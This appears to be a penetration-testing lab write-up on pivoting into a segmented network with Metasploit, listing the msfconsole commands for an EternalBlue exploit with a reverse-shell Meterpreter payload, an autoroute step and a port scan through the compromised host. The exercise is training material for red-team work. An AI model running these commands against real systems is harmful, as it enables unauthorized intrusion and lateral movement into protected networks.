# Pivoting Using Metasploit and Meterpreter

 ### [YouTube Demonstration](https://youtu.be/CeRYDpKfscg)

## Background

Some networks are architected to isolate business-critical machines from the Internet and machines located on the corporate network that are considered more likely to be compromised. This isolation strategy is implemented using Virtual LANs (VLANs) or physical segmentation.

In many cases, network engineers and system administrators will still need a way to access those restricted networks to manage them (i.e., troubleshoot bugs, patch applications, reboot machines, etc.).

As a penetration tester or red teamer, you will need to identify users who have a legitimate business requirement for accessing restricted networks. Then, you will need to identify the machines they use to manage those networks and compromise them.

Once a machine that has access to restricted networks has been compromised, you will need to forward your network traffic through that machine to access the machines in the restricted network. This technique is often referred to as 'pivoting' because you are using one machine to pivot into an otherwise inaccessible network environment.

## Project Overview

In this project, I configured Metasploit to tunnel network traffic to Target 2 via Target 1, using the Meterpreter implant as the tunnel. This exercise taught me the pivoting technique needed to obtain unauthorized access to restricted networks segmented from the Internet and the corporate network.

## Lab Setup

For this exercise, the following lab setup was used:
- **Kali Machine (Attacker)**
- **Target Machine with a Meterpreter implant (Target 1)**
- **Target Machine that the Kali machine cannot directly reach, with an open port running a service (Target 2)**

## Steps Taken

1. **Obtain a Meterpreter Session on Target 1**:
   - Launched Metasploit and used an appropriate exploit to gain a Meterpreter session on Target 1.

    ```plaintext
    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOST <target1_ip>
    set payload windows/meterpreter/reverse_tcp
    set LHOST <your_ip>
    set LPORT <your_port>
    exploit
    ```

2. **Add a Route to Target 2**:
   - Within the Meterpreter session on Target 1, added a route to Target 2.

    ```plaintext
    run autoroute -s <target2_ip_subnet>
    ```

3. **Perform a Port Scan Against Target 2**:
   - Used Metasploit's auxiliary modules to perform a port scan against Target 2.

    ```plaintext
    use auxiliary/scanner/portscan/tcp
    set RHOSTS <target2_ip>
    run
    ```

## Validation

- Validated that the Attack box could communicate with Target 1 but could not reach Target 2 directly.
- Verified that the Attack box could not see the open port and service running on Target 2.
- Demonstrated that the open port and service running on Target 2 could be identified via the Meterpreter session running on Target 1.

## Learning Objectives Achieved

- **Pivoting Technique**: Learned how to use Metasploit to pivot through a compromised machine to access an otherwise inaccessible network environment.
- **Post-Exploitation**: Understood the importance of identifying and compromising machines with legitimate access to restricted networks.


